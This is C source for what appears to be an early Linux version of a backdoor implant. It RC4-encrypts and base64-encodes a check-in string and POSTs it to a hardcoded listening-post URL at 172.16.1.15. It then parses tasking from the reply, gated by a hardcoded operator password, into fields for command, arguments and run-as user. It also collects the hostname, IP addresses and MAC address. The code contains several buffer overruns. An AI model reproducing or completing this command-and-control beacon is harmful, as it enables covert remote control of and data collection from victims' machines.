#include <stdio.h>
#include <locale.h>
#include <sysexits.h>
#include <stdlib.h>
#include <curl/curl.h> // For web request
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <ifaddrs.h> // Get ifaddrs struct
#include <arpa/inet.h> // Get INET_ADDRSTRLEN
#include <netinet/in.h> //Get AF_INET and AF_INET6 
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>

void test(){

}
#if defined (SIOCGIFHWADDR) && !defined (HAVE_SIOCGIFHWADDR)
# define HAVE_SIOCGIFHWADDR
#endif
#if defined(HAVE_SIOCGIFHWADDR)
void get_mac_address(int socketHandle){

    struct ifreq s;

    strcpy(s.ifr_name, "eth0");
    if (ioctl(socketHandle, SIOCGIFHWADDR, &s) == 0) {
        int i;
        for (i = 0; i < 6; ++i){
            //printf("%02x:", (unsigned char) s.ifr_addr.sa_data[i]);
        }
//	puts("\n");
    }

}
#endif

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

void build_decoding_table() {
    int i;
    decoding_table = malloc(256);

    for (i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}

char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {
    int i,j;
    *output_length = ((input_length - 1) / 3) * 4 + 4;

    char *encoded_data = malloc(*output_length);
    if (encoded_data == NULL) return NULL;

    for (i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}


unsigned char *base64_decode(const char *data,
                             size_t input_length,
                             size_t *output_length) {
    int i,j;
    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char *decoded_data = malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}





void base64_cleanup() {
    free(decoding_table);
}

char* getPrimaryIP(){
    char *addressBuffer = malloc(INET_ADDRSTRLEN);
    int socketHandle;
   

    // Craft a UDP socket request to google DNS
    struct sockaddr_in myaddr;
    myaddr.sin_family = AF_INET;
    int retAton = inet_aton("8.8.8.8", &myaddr.sin_addr);
    if( retAton == 0){
        fprintf(stderr,"Invalid address: inet_aton(3)\n");
        exit(1);
    }
    myaddr.sin_port = htons(53);
    
    socketHandle = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if( socketHandle == -1){
        fprintf(stderr,"%s: socket(2)\n",strerror(errno));
        exit(1);
    }
    get_mac_address(socketHandle);
    // Connect to the socket in question
    int retConnect = connect(socketHandle, (struct sockaddr*)&myaddr, (socklen_t)(sizeof(myaddr)));
    if( retConnect == -1){
        fprintf(stderr,"%s: connect(2)\n",strerror(errno));
        exit(1);
    }

    // Grab the information about local bound socket
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    int retSockname = getsockname(socketHandle, (struct sockaddr*) &name, &namelen);
    if( retSockname == -1){
        fprintf(stderr,"%s: getsockname(2)\n",strerror(errno));
        exit(1);
    }

   // Convert the socket address and store it
   const char* p = inet_ntop(AF_INET, &name.sin_addr, addressBuffer, INET_ADDRSTRLEN);
    if( p == NULL){
        fprintf(stderr,"%s: inet_ntop(3)\n",strerror(errno));
        exit(1);
    }
    close(socketHandle);

    return addressBuffer;    

    
}
char *rc4(char *str, const char *key){
    char * a;
    unsigned char s[256];
    unsigned char r[256];
    int i,j,x,y,t;
    for(i = 0;i<256;i++){
        r[i] = key[i % (int)strlen(key)];
        s[i] = i;
    }
    j = 0;
    for(i=0;i<256;i++){
        j = (j + s[i] + r[i]) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
    }
    i = 0;
    j = 0;
    a = (char*) malloc(strlen(str));
    if (a==NULL) exit (1);
    for(y=0;y<strlen(str);y++){
        i = (i+1) % 256;
        j = (j + s[i]) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;

        t = (s[(s[i] + s[j]) % 256]);
        if(t == str[y]){
            a[y] = (str[y]);
        }else{
            a[y] = (t ^ str[y]);
        }
        
    }

    return a;
}

/* the function to invoke as the data recieved */
size_t static write_callback_func(void *buffer,
                        size_t size,
                        size_t nmemb,
                        void *userp)
{
    char **response_ptr =  (char**)userp;

    /* assuming the response is a string */
    *response_ptr = strndup(buffer, (size_t)(size *nmemb));
    return size *nmemb;

}

int main(int argc, char *argv[]){
    int i = 0;
  
    const wchar_t GOODCHAR = '~';
    const wchar_t BADCHAR = '+';
    const char *key = "ZAQwsxcde321";
    // Get our RC4 encoded string
    char *z = rc4("enc=123spec!alk3y456&hn=D&num=172.16.1.15&id=3&pp=0&vn=0.1&cb=-1",key);
    size_t x;
    // Get size of our string base64 encoded
    char *base = base64_encode(z,strlen(z),&x);
    for (i = 0; i < strlen(base); i++){
        if(base[i] == BADCHAR){
            base[i] = GOODCHAR;
        }
    }
    // Allocate space for our final data +3 for "pd="
    char *to = (char*) malloc(x+3);
    strncpy(to,"pd=",3);
    strncat(to, base, x);
    char *response = NULL;
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if(curl){
            curl_easy_setopt(curl,CURLOPT_URL,"http://172.16.1.15/ThrowbackLP/");
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, to);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_func);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    }
    
    res = curl_easy_perform(curl);
    if(res != CURLE_OK){
        fprintf(stderr, "curl_easy_perform() failed %s\n",curl_easy_strerror(res));
    }
    curl_easy_cleanup(curl);
    
    
    // Identify the last newline which should be 
    int stringStart = 0;
    for (i = strlen(response); i > 0 ; i--){
        if(response[i] == '\n'){
            stringStart = i+1;  
            break;
        }
    }
    // get the substring for the last line
    unsigned int size = (strlen(response) - stringStart);
    char *command = (char*) malloc(size);
    memcpy(command, &response[stringStart], size );
    command[size] = '\0';
    int spaces[3];
    int counter = 0;
    int parseCommand = 0;
    // Get first split in string
    for (i = 0; i < strlen(command); i++){
        if(command[i] == ' '){
            spaces[counter] = i;
            // Make sure we don't overflow our buffer only allow 3 spaces to be recorded
            if(counter < (sizeof(spaces)/sizeof(spaces[0]))-1 ){
                counter++;
            }else{
                break;
            }
        }
    }
    // Get the key to verify it is a legit user
    size = (spaces[1]-spaces[0]);
    char *k = (char*)malloc(size);
    memcpy(k, &command[spaces[0]+1], size-1 );
    k[size] = '\0';
    if( strcmp(k,"stup1fy") == 0) {
        parseCommand = 1;
    }
    // Free up our allocated space   
    free(k);
    free(to);
    
    if(parseCommand == 1){
        // Get the command
        size = spaces[2]-spaces[1];
        char *com = (char*)malloc(size);
        memcpy(com, &command[spaces[1]+1], size-1 );
        com[size] = '\0';
        unsigned int comSep[6] = { 0, 0, 0, 0, 0, 0 };

        counter = 0;
        for(i =  0; i < strlen(com); i++){
            if(com[i] == '&'){     
                if(counter < 7){
                    comSep[counter] = i;
                }else{
                    break;
                }
                counter++;
            }
            
        }

        int success = 1;
        // Check if we've parsed all our commands out
        for(i =0; i < (sizeof(comSep)/sizeof(comSep[0])); i++){
            if(comSep[i] == 0){
                success = 0;              
            }                        
        }

        // if we were able to parse our command spaces
        if(success == 1){
            // Allocate our space for data
            char *todo = (char*)malloc(comSep[0]+1);
            //printf("%d-",comSep[0]+1);
            char *pk = (char*)malloc(comSep[1] - comSep[0]);
            //printf("%d-",(comSep[1] - comSep[0]));
            char *command = (char*)malloc(comSep[2] - comSep[1]);
            //printf("%d-",(comSep[2] - comSep[1]));
            char *args = (char*)malloc(comSep[3] - comSep[2]);
           // printf("%d-",comSep[3] - comSep[2]);
            char *runas = (char*)malloc(comSep[4] - comSep[3]);
            //printf("%d-",(comSep[4] - comSep[3]));
            char *reserved1 = (char*)malloc(comSep[5] - comSep[4]);
            //printf("%d-",(comSep[5] - comSep[4]));
            char *reserved2 = (char*)malloc(strlen(com) - comSep[5]);
            //printf("%d-",(strlen(com) - comSep[5]));
            
            // Copy the data in
            memcpy(todo, &com[0], comSep[0] );
            todo[comSep[0]] = '\0';
            printf("%s\n",todo);

            memcpy(pk, &com[comSep[0]]+1, (comSep[1] - comSep[0])-1 );
            pk[(comSep[1] - comSep[0])-1] = '\0';
            printf("%s\n",pk);

            memcpy(command, &com[comSep[1]]+1, (comSep[2] - comSep[1])-1 );
            command[(comSep[2] - comSep[1])-1] = '\0';
            printf("%s\n",command);

            memcpy(args, &com[comSep[2]]+1, (comSep[3] - comSep[2])-1 );
            args[(comSep[3] - comSep[2])-1] = '\0';
            printf("%s\n",args);

            memcpy(runas, &com[comSep[3]]+1, (comSep[4] - comSep[3])-1 );
            runas[(comSep[4] - comSep[3])-1] = '\0';
            printf("%s\n",args);

            memcpy(reserved1, &com[comSep[4]]+1, (comSep[5] - comSep[4])-1 );
            reserved1[(comSep[5] - comSep[4])-1] = '\0';
            printf("%s\n",reserved1);
            
            memcpy(reserved2, &com[comSep[5]]+1, (strlen(com) - comSep[5])-1 );
            reserved2[(strlen(com) - comSep[5])-1] = '\0';
            printf("%s",reserved2);
            
         }
        // We've processed out our command time to free it
        free(com);

        //int todonum = atoi(todo);

       // if(todonum == 5){

    
    }
    // We've returned from the area where we've been using our orig command
    free(command);

 

    

    char hostname[HOST_NAME_MAX];
    struct ifaddrs * ifAddrStruct=NULL;
    struct ifaddrs * ifa=NULL;
    void * tmpAddrPtr=NULL;
    char *ret;
    char host[] = "127.0.0.1";
    int port = 80;
    int retHostname = gethostname(hostname,sizeof(hostname));
    if( retHostname == -1 ){
        fprintf(stderr, "%s: gethostname(2)\n",strerror(errno));
        exit(1);
    }
    //printf("host name = '%s'\n", hostname);
    
    char *internetIP = getPrimaryIP();

    
    int retIP = getifaddrs(&ifAddrStruct);
    if( retIP == -1){
        fprintf(stderr,"%s: getifaddress(3)\n",strerror(errno));
        exit(1);
    }
    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next){
        if (!ifa->ifa_addr){
            continue;
        }
        // Iterate through the IPv4 addresses only
        if(ifa->ifa_addr->sa_family == AF_INET){ 
            tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
	    char addressBuffer[INET_ADDRSTRLEN];
 	    inet_ntop(AF_INET,tmpAddrPtr,addressBuffer,INET_ADDRSTRLEN);
	    if(strcmp (internetIP,addressBuffer) == 0){
		    //printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer);
	    }
        }
    }
    free(internetIP);
    freeifaddrs(ifAddrStruct);

    ret = setlocale(LC_ALL,"");
    if(ret == NULL){
   	fprintf(stderr, "Unable to set locale\n");
	exit(EX_OSERR);
    }
   // printf("Hello World");
}
